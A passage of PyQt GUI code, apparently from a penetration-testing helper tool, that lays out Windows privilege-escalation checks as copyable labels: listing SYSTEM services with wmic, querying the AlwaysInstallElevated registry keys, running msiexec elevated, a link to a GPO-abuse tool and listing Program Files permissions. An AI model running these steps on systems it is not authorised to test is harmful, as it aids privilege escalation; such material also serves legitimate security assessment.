        self.wpe_1_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_1_divider2
        if hasattr(self, 'wpe_1_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_1_divider2)
            self.wpe_1_divider2.deleteLater()
        self.wpe_1_divider2 = QFrame()
        self.wpe_1_divider2.setFrameShape(QFrame.HLine)
        self.wpe_1_divider2.setLineWidth(3)
        self.wpe_1_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_1_spacer1
        if hasattr(self, 'wpe_1_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_1_spacer1)
            self.wpe_1_spacer1.deleteLater()
        self.wpe_1_spacer1 = QLabel()
        self.wpe_1_spacer1.setFixedWidth(40)
        self.wpe_1_spacer1.setFixedHeight(50)
     
        # wpe_1_spacer2
        if hasattr(self, 'wpe_1_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_1_spacer2)
            self.wpe_1_spacer2.deleteLater()
        self.wpe_1_spacer2 = QLabel()
        self.wpe_1_spacer2.setFixedWidth(40)
        self.wpe_1_spacer2.setFixedHeight(50)
     
        # wpe_1 spacer & divider layout
        self.tab4_container_layout.insertWidget(17, self.wpe_1_spacer1)
        self.tab4_container_layout.insertWidget(18, self.wpe_1_divider1)
        self.tab4_container_layout.insertWidget(19, self.wpe_1_divider2)
        self.tab4_container_layout.insertWidget(20, self.wpe_1_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_2
        if hasattr(self, 'wpe_2'):
            self.tab4_container_layout.removeWidget(self.wpe_2)
            self.wpe_2.deleteLater()
        self.wpe_2 = QLabel("[ + List out all NT AUTHORITY/SYSTEM Services ]")
        self.wpe_2.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(21,self.wpe_2)
     
        # wpe_2_Scan1
        if hasattr(self, 'wpe_2_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_2_Scan1)
            self.wpe_2_Scan1.deleteLater()
        self.wpe_2_Scan1 = QLabel("wmic service get name,startname |FINDSTR \"NT\"")
        self.wpe_2_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(22,self.wpe_2_Scan1)
     
        # wpe_2_Scan1_Copy
        if hasattr(self, 'wpe_2_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_2_Scan1_Copy)
            self.wpe_2_Scan1_Copy.deleteLater()
        self.wpe_2_Scan1_Copy = QPushButton()
        self.wpe_2_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_2_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_2_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_2_Scan1.text()))
        self.wpe_2_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_2_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_2_Scan1_Copy)
        label_layout.addWidget(self.wpe_2_Scan1)
        self.tab4_container_layout.insertLayout(23, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_2_divider1
        if hasattr(self, 'wpe_2_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_2_divider1)
            self.wpe_2_divider1.deleteLater()
        self.wpe_2_divider1 = QFrame()
        self.wpe_2_divider1.setFrameShape(QFrame.HLine)
        self.wpe_2_divider1.setLineWidth(3)
        self.wpe_2_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_2_divider2
        if hasattr(self, 'wpe_2_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_2_divider2)
            self.wpe_2_divider2.deleteLater()
        self.wpe_2_divider2 = QFrame()
        self.wpe_2_divider2.setFrameShape(QFrame.HLine)
        self.wpe_2_divider2.setLineWidth(3)
        self.wpe_2_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_2_spacer1
        if hasattr(self, 'wpe_2_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_2_spacer1)
            self.wpe_2_spacer1.deleteLater()
        self.wpe_2_spacer1 = QLabel()
        self.wpe_2_spacer1.setFixedWidth(40)
        self.wpe_2_spacer1.setFixedHeight(50)
     
        # wpe_2_spacer2
        if hasattr(self, 'wpe_2_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_2_spacer2)
            self.wpe_2_spacer2.deleteLater()
        self.wpe_2_spacer2 = QLabel()
        self.wpe_2_spacer2.setFixedWidth(40)
        self.wpe_2_spacer2.setFixedHeight(50)
     
        # wpe_2 spacer & divider layout
        self.tab4_container_layout.insertWidget(24, self.wpe_2_spacer1)
        self.tab4_container_layout.insertWidget(25, self.wpe_2_divider1)
        self.tab4_container_layout.insertWidget(26, self.wpe_2_divider2)
        self.tab4_container_layout.insertWidget(27, self.wpe_2_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_3
        if hasattr(self, 'wpe_3'):
            self.tab4_container_layout.removeWidget(self.wpe_3)
            self.wpe_3.deleteLater()
        self.wpe_3 = QLabel("[ + Can we Install Things Elevated ]")
        self.wpe_3.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(28,self.wpe_3)
     
        # wpe_3_Scan1
        if hasattr(self, 'wpe_3_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan1)
            self.wpe_3_Scan1.deleteLater()
        self.wpe_3_Scan1 = QLabel("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
        self.wpe_3_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(29,self.wpe_3_Scan1)
     
        # wpe_3_Scan1_Copy
        if hasattr(self, 'wpe_3_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan1_Copy)
            self.wpe_3_Scan1_Copy.deleteLater()
        self.wpe_3_Scan1_Copy = QPushButton()
        self.wpe_3_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_3_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_3_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_3_Scan1.text()))
        self.wpe_3_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_3_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_3_Scan1_Copy)
        label_layout.addWidget(self.wpe_3_Scan1)
        self.tab4_container_layout.insertLayout(30, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_3_divider1
        if hasattr(self, 'wpe_3_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_divider1)
            self.wpe_3_divider1.deleteLater()
        self.wpe_3_divider1 = QFrame()
        self.wpe_3_divider1.setFrameShape(QFrame.HLine)
        self.wpe_3_divider1.setLineWidth(3)
        self.wpe_3_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_3_divider2
        if hasattr(self, 'wpe_3_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_divider2)
            self.wpe_3_divider2.deleteLater()
        self.wpe_3_divider2 = QFrame()
        self.wpe_3_divider2.setFrameShape(QFrame.HLine)
        self.wpe_3_divider2.setLineWidth(3)
        self.wpe_3_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_3_spacer1
        if hasattr(self, 'wpe_3_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_spacer1)
            self.wpe_3_spacer1.deleteLater()
        self.wpe_3_spacer1 = QLabel()
        self.wpe_3_spacer1.setFixedWidth(40)
        self.wpe_3_spacer1.setFixedHeight(50)
     
        # wpe_3_spacer2
        if hasattr(self, 'wpe_3_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_spacer2)
            self.wpe_3_spacer2.deleteLater()
        self.wpe_3_spacer2 = QLabel()
        self.wpe_3_spacer2.setFixedWidth(40)
        self.wpe_3_spacer2.setFixedHeight(50)
     
        # wpe_3 spacer & divider layout
        self.tab4_container_layout.insertWidget(31, self.wpe_3_spacer1)
        self.tab4_container_layout.insertWidget(32, self.wpe_3_divider1)
        self.tab4_container_layout.insertWidget(33, self.wpe_3_divider2)
        self.tab4_container_layout.insertWidget(34, self.wpe_3_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_3_Scan2
        if hasattr(self, 'wpe_3_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan2)
            self.wpe_3_Scan2.deleteLater()
        self.wpe_3_Scan2 = QLabel("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
        self.wpe_3_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(35,self.wpe_3_Scan2)
     
        # wpe_3_Scan2_Copy
        if hasattr(self, 'wpe_3_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan2_Copy)
            self.wpe_3_Scan2_Copy.deleteLater()
        self.wpe_3_Scan2_Copy = QPushButton()
        self.wpe_3_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_3_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_3_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_3_Scan2.text()))
        self.wpe_3_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_3_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_3_Scan2_Copy)
        label_layout.addWidget(self.wpe_3_Scan2)
        self.tab4_container_layout.insertLayout(36, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_3_divider1
        if hasattr(self, 'wpe_3_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_divider1)
            self.wpe_3_divider1.deleteLater()
        self.wpe_3_divider1 = QFrame()
        self.wpe_3_divider1.setFrameShape(QFrame.HLine)
        self.wpe_3_divider1.setLineWidth(3)
        self.wpe_3_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_3_divider2
        if hasattr(self, 'wpe_3_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_divider2)
            self.wpe_3_divider2.deleteLater()
        self.wpe_3_divider2 = QFrame()
        self.wpe_3_divider2.setFrameShape(QFrame.HLine)
        self.wpe_3_divider2.setLineWidth(3)
        self.wpe_3_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_3_spacer1
        if hasattr(self, 'wpe_3_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_spacer1)
            self.wpe_3_spacer1.deleteLater()
        self.wpe_3_spacer1 = QLabel()
        self.wpe_3_spacer1.setFixedWidth(40)
        self.wpe_3_spacer1.setFixedHeight(50)
     
        # wpe_3_spacer2
        if hasattr(self, 'wpe_3_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_spacer2)
            self.wpe_3_spacer2.deleteLater()
        self.wpe_3_spacer2 = QLabel()
        self.wpe_3_spacer2.setFixedWidth(40)
        self.wpe_3_spacer2.setFixedHeight(50)
     
        # wpe_3 spacer & divider layout
        self.tab4_container_layout.insertWidget(37, self.wpe_3_spacer1)
        self.tab4_container_layout.insertWidget(38, self.wpe_3_divider1)
        self.tab4_container_layout.insertWidget(39, self.wpe_3_divider2)
        self.tab4_container_layout.insertWidget(40, self.wpe_3_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_3_Scan3
        if hasattr(self, 'wpe_3_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan3)
            self.wpe_3_Scan3.deleteLater()
        self.wpe_3_Scan3 = QLabel("[ - Installing Elevated]")
        self.wpe_3_Scan3.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(41,self.wpe_3_Scan3)
     
        # wpe_3_Scan4
        if hasattr(self, 'wpe_3_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan4)
            self.wpe_3_Scan4.deleteLater()
        self.wpe_3_Scan4 = QLabel("msiexec /i <path to msi file>")
        self.wpe_3_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(42,self.wpe_3_Scan4)
     
        # wpe_3_Scan4_Copy
        if hasattr(self, 'wpe_3_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_3_Scan4_Copy)
            self.wpe_3_Scan4_Copy.deleteLater()
        self.wpe_3_Scan4_Copy = QPushButton()
        self.wpe_3_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_3_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_3_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_3_Scan4.text()))
        self.wpe_3_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_3_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_3_Scan4_Copy)
        label_layout.addWidget(self.wpe_3_Scan4)
        self.tab4_container_layout.insertLayout(43, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_3_divider1
        if hasattr(self, 'wpe_3_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_divider1)
            self.wpe_3_divider1.deleteLater()
        self.wpe_3_divider1 = QFrame()
        self.wpe_3_divider1.setFrameShape(QFrame.HLine)
        self.wpe_3_divider1.setLineWidth(3)
        self.wpe_3_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_3_divider2
        if hasattr(self, 'wpe_3_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_divider2)
            self.wpe_3_divider2.deleteLater()
        self.wpe_3_divider2 = QFrame()
        self.wpe_3_divider2.setFrameShape(QFrame.HLine)
        self.wpe_3_divider2.setLineWidth(3)
        self.wpe_3_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_3_spacer1
        if hasattr(self, 'wpe_3_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_3_spacer1)
            self.wpe_3_spacer1.deleteLater()
        self.wpe_3_spacer1 = QLabel()
        self.wpe_3_spacer1.setFixedWidth(40)
        self.wpe_3_spacer1.setFixedHeight(50)
     
        # wpe_3_spacer2
        if hasattr(self, 'wpe_3_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_3_spacer2)
            self.wpe_3_spacer2.deleteLater()
        self.wpe_3_spacer2 = QLabel()
        self.wpe_3_spacer2.setFixedWidth(40)
        self.wpe_3_spacer2.setFixedHeight(50)
     
        # wpe_3 spacer & divider layout
        self.tab4_container_layout.insertWidget(44, self.wpe_3_spacer1)
        self.tab4_container_layout.insertWidget(45, self.wpe_3_divider1)
        self.tab4_container_layout.insertWidget(46, self.wpe_3_divider2)
        self.tab4_container_layout.insertWidget(47, self.wpe_3_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_4
        if hasattr(self, 'wpe_4'):
            self.tab4_container_layout.removeWidget(self.wpe_4)
            self.wpe_4.deleteLater()
        self.wpe_4 = QLabel("[ + Some Domains.xml Abuse ]")
        self.wpe_4.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(48,self.wpe_4)
     
        # wpe_4_Scan1
        if hasattr(self, 'wpe_4_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_4_Scan1)
            self.wpe_4_Scan1.deleteLater()
        self.wpe_4_Scan1 = QLabel("https:/ithub.com/FSecureLABS/SharpGPOAbuse")
        self.wpe_4_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(49,self.wpe_4_Scan1)
     
        # wpe_4_Scan1_Copy
        if hasattr(self, 'wpe_4_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_4_Scan1_Copy)
            self.wpe_4_Scan1_Copy.deleteLater()
        self.wpe_4_Scan1_Copy = QPushButton()
        self.wpe_4_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_4_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_4_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_4_Scan1.text()))
        self.wpe_4_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_4_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_4_Scan1_Copy)
        label_layout.addWidget(self.wpe_4_Scan1)
        self.tab4_container_layout.insertLayout(50, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_4_divider1
        if hasattr(self, 'wpe_4_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_4_divider1)
            self.wpe_4_divider1.deleteLater()
        self.wpe_4_divider1 = QFrame()
        self.wpe_4_divider1.setFrameShape(QFrame.HLine)
        self.wpe_4_divider1.setLineWidth(3)
        self.wpe_4_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_4_divider2
        if hasattr(self, 'wpe_4_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_4_divider2)
            self.wpe_4_divider2.deleteLater()
        self.wpe_4_divider2 = QFrame()
        self.wpe_4_divider2.setFrameShape(QFrame.HLine)
        self.wpe_4_divider2.setLineWidth(3)
        self.wpe_4_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_4_spacer1
        if hasattr(self, 'wpe_4_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_4_spacer1)
            self.wpe_4_spacer1.deleteLater()
        self.wpe_4_spacer1 = QLabel()
        self.wpe_4_spacer1.setFixedWidth(40)
        self.wpe_4_spacer1.setFixedHeight(50)
     
        # wpe_4_spacer2
        if hasattr(self, 'wpe_4_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_4_spacer2)
            self.wpe_4_spacer2.deleteLater()
        self.wpe_4_spacer2 = QLabel()
        self.wpe_4_spacer2.setFixedWidth(40)
        self.wpe_4_spacer2.setFixedHeight(50)
     
        # wpe_4 spacer & divider layout
        self.tab4_container_layout.insertWidget(51, self.wpe_4_spacer1)
        self.tab4_container_layout.insertWidget(52, self.wpe_4_divider1)
        self.tab4_container_layout.insertWidget(53, self.wpe_4_divider2)
        self.tab4_container_layout.insertWidget(54, self.wpe_4_spacer2)
        self.tab4_container_layout.addStretch()
     
    # wpe_5
        if hasattr(self, 'wpe_5'):
            self.tab4_container_layout.removeWidget(self.wpe_5)
            self.wpe_5.deleteLater()
        self.wpe_5 = QLabel("[ + executable binary or service in Program Files ]")
        self.wpe_5.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(55,self.wpe_5)
     
        # wpe_5_Scan1
        if hasattr(self, 'wpe_5_Scan1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan1)
            self.wpe_5_Scan1.deleteLater()
        self.wpe_5_Scan1 = QLabel("cd \"C:\\Program Files\"")
        self.wpe_5_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(56,self.wpe_5_Scan1)
     
        # wpe_5_Scan1_Copy
        if hasattr(self, 'wpe_5_Scan1_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan1_Copy)
            self.wpe_5_Scan1_Copy.deleteLater()
        self.wpe_5_Scan1_Copy = QPushButton()
        self.wpe_5_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_5_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpe_5_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_5_Scan1.text()))
        self.wpe_5_Scan1_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_5_Scan1 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_5_Scan1_Copy)
        label_layout.addWidget(self.wpe_5_Scan1)
        self.tab4_container_layout.insertLayout(57, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_divider1
        if hasattr(self, 'wpe_5_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider1)
            self.wpe_5_divider1.deleteLater()
        self.wpe_5_divider1 = QFrame()
        self.wpe_5_divider1.setFrameShape(QFrame.HLine)
        self.wpe_5_divider1.setLineWidth(3)
        self.wpe_5_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_5_divider2
        if hasattr(self, 'wpe_5_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider2)
            self.wpe_5_divider2.deleteLater()
        self.wpe_5_divider2 = QFrame()
        self.wpe_5_divider2.setFrameShape(QFrame.HLine)
        self.wpe_5_divider2.setLineWidth(3)
        self.wpe_5_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_5_spacer1
        if hasattr(self, 'wpe_5_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer1)
            self.wpe_5_spacer1.deleteLater()
        self.wpe_5_spacer1 = QLabel()
        self.wpe_5_spacer1.setFixedWidth(40)
        self.wpe_5_spacer1.setFixedHeight(50)
     
        # wpe_5_spacer2
        if hasattr(self, 'wpe_5_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer2)
            self.wpe_5_spacer2.deleteLater()
        self.wpe_5_spacer2 = QLabel()
        self.wpe_5_spacer2.setFixedWidth(40)
        self.wpe_5_spacer2.setFixedHeight(50)
     
        # wpe_5 spacer & divider layout
        self.tab4_container_layout.insertWidget(58, self.wpe_5_spacer1)
        self.tab4_container_layout.insertWidget(59, self.wpe_5_divider1)
        self.tab4_container_layout.insertWidget(60, self.wpe_5_divider2)
        self.tab4_container_layout.insertWidget(61, self.wpe_5_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_Scan2
        if hasattr(self, 'wpe_5_Scan2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan2)
            self.wpe_5_Scan2.deleteLater()
        self.wpe_5_Scan2 = QLabel("DIR /A /O /Q")
        self.wpe_5_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(62,self.wpe_5_Scan2)
     
        # wpe_5_Scan2_Copy
        if hasattr(self, 'wpe_5_Scan2_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan2_Copy)
            self.wpe_5_Scan2_Copy.deleteLater()
        self.wpe_5_Scan2_Copy = QPushButton()
        self.wpe_5_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_5_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wpe_5_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_5_Scan2.text()))
        self.wpe_5_Scan2_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_5_Scan2 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_5_Scan2_Copy)
        label_layout.addWidget(self.wpe_5_Scan2)
        self.tab4_container_layout.insertLayout(63, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_divider1
        if hasattr(self, 'wpe_5_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider1)
            self.wpe_5_divider1.deleteLater()
        self.wpe_5_divider1 = QFrame()
        self.wpe_5_divider1.setFrameShape(QFrame.HLine)
        self.wpe_5_divider1.setLineWidth(3)
        self.wpe_5_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_5_divider2
        if hasattr(self, 'wpe_5_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider2)
            self.wpe_5_divider2.deleteLater()
        self.wpe_5_divider2 = QFrame()
        self.wpe_5_divider2.setFrameShape(QFrame.HLine)
        self.wpe_5_divider2.setLineWidth(3)
        self.wpe_5_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_5_spacer1
        if hasattr(self, 'wpe_5_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer1)
            self.wpe_5_spacer1.deleteLater()
        self.wpe_5_spacer1 = QLabel()
        self.wpe_5_spacer1.setFixedWidth(40)
        self.wpe_5_spacer1.setFixedHeight(50)
     
        # wpe_5_spacer2
        if hasattr(self, 'wpe_5_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer2)
            self.wpe_5_spacer2.deleteLater()
        self.wpe_5_spacer2 = QLabel()
        self.wpe_5_spacer2.setFixedWidth(40)
        self.wpe_5_spacer2.setFixedHeight(50)
     
        # wpe_5 spacer & divider layout
        self.tab4_container_layout.insertWidget(64, self.wpe_5_spacer1)
        self.tab4_container_layout.insertWidget(65, self.wpe_5_divider1)
        self.tab4_container_layout.insertWidget(66, self.wpe_5_divider2)
        self.tab4_container_layout.insertWidget(67, self.wpe_5_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_Scan3
        if hasattr(self, 'wpe_5_Scan3'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan3)
            self.wpe_5_Scan3.deleteLater()
        self.wpe_5_Scan3 = QLabel("cd \"C:\\Program Files (x86)\"")
        self.wpe_5_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(68,self.wpe_5_Scan3)
     
        # wpe_5_Scan3_Copy
        if hasattr(self, 'wpe_5_Scan3_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan3_Copy)
            self.wpe_5_Scan3_Copy.deleteLater()
        self.wpe_5_Scan3_Copy = QPushButton()
        self.wpe_5_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_5_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wpe_5_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_5_Scan3.text()))
        self.wpe_5_Scan3_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_5_Scan3 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_5_Scan3_Copy)
        label_layout.addWidget(self.wpe_5_Scan3)
        self.tab4_container_layout.insertLayout(69, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_divider1
        if hasattr(self, 'wpe_5_divider1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider1)
            self.wpe_5_divider1.deleteLater()
        self.wpe_5_divider1 = QFrame()
        self.wpe_5_divider1.setFrameShape(QFrame.HLine)
        self.wpe_5_divider1.setLineWidth(3)
        self.wpe_5_divider1.setStyleSheet("color: #20C20E;")
     
        # wpe_5_divider2
        if hasattr(self, 'wpe_5_divider2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_divider2)
            self.wpe_5_divider2.deleteLater()
        self.wpe_5_divider2 = QFrame()
        self.wpe_5_divider2.setFrameShape(QFrame.HLine)
        self.wpe_5_divider2.setLineWidth(3)
        self.wpe_5_divider2.setStyleSheet("color: #20C20E;")
     
        # wpe_5_spacer1
        if hasattr(self, 'wpe_5_spacer1'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer1)
            self.wpe_5_spacer1.deleteLater()
        self.wpe_5_spacer1 = QLabel()
        self.wpe_5_spacer1.setFixedWidth(40)
        self.wpe_5_spacer1.setFixedHeight(50)
     
        # wpe_5_spacer2
        if hasattr(self, 'wpe_5_spacer2'):
            self.tab4_container_layout.removeWidget(self.wpe_5_spacer2)
            self.wpe_5_spacer2.deleteLater()
        self.wpe_5_spacer2 = QLabel()
        self.wpe_5_spacer2.setFixedWidth(40)
        self.wpe_5_spacer2.setFixedHeight(50)
     
        # wpe_5 spacer & divider layout
        self.tab4_container_layout.insertWidget(70, self.wpe_5_spacer1)
        self.tab4_container_layout.insertWidget(71, self.wpe_5_divider1)
        self.tab4_container_layout.insertWidget(72, self.wpe_5_divider2)
        self.tab4_container_layout.insertWidget(73, self.wpe_5_spacer2)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_Scan4
        if hasattr(self, 'wpe_5_Scan4'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan4)
            self.wpe_5_Scan4.deleteLater()
        self.wpe_5_Scan4 = QLabel("DIR /A /O /Q")
        self.wpe_5_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab4_container_layout.insertWidget(74,self.wpe_5_Scan4)
     
        # wpe_5_Scan4_Copy
        if hasattr(self, 'wpe_5_Scan4_Copy'):
            self.tab4_container_layout.removeWidget(self.wpe_5_Scan4_Copy)
            self.wpe_5_Scan4_Copy.deleteLater()
        self.wpe_5_Scan4_Copy = QPushButton()
        self.wpe_5_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpe_5_Scan4_Copy.setFixedSize(QSize(20,20))
        self.wpe_5_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpe_5_Scan4.text()))
        self.wpe_5_Scan4_Copy.setStyleSheet(
        "*:hover{background: '#20C20E';}"
        )
     
        # wpe_5_Scan4 adding Widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpe_5_Scan4_Copy)
        label_layout.addWidget(self.wpe_5_Scan4)
        self.tab4_container_layout.insertLayout(75, label_layout)
        self.tab4_container_layout.addStretch()
     
        # wpe_5_divider1
